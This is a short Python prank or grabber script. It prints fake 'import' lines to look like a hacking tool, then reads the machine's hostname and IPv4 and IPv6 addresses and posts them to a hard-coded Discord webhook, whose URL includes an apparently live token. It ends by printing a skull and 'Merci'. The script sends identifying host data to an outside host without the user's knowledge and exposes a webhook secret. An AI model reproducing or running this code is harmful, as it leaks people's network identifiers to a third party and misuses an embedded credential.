import time
import socket
import requests

code_lines = ["import os", "Import of registered passwords to CV-PWD", "import CV-CAGE", "import random", "import socket", "import subprocess"]

print("Loading...")
time.sleep(1)
for line in code_lines:
    print(line)
    time.sleep(0.5)

# Get the IP addresses
hostname = socket.gethostname()
ipv4_address = socket.gethostbyname(hostname)
ipv6_address = socket.getaddrinfo(hostname, None, socket.AF_INET6)[0][4][0]

print("IPv4 Address: " + ipv4_address)
print("IPv6 Address: " + ipv6_address)

# Send the IP addresses and hostname to Discord
webhook_url = 'https://discord.com/api/webhooks/1063932005026369536/byBRhuemD3H5Z7Z5ryGo4UVU0-5jdK_hZVTRzfCWEfBnmWyI2dhnBIOCnbBQ4U6vTPfm'

data = {'content': f'The hostname of the machine is: {hostname}, IPv4 address of the machine is: {ipv4_address} and the IPv6 address of the machine is: {ipv6_address}'}

response = requests.post(webhook_url, json=data)

print(response)

skull = """
             .-""""""-.
           .'          '.
          /   O      O   \\
         :                :
         |                |
         : ',          ,' :
          \\  '-......-'  /
           '.          .'
             '-......-'
"""

print(skull)
print("Merci")
input("Press enter to exit...")
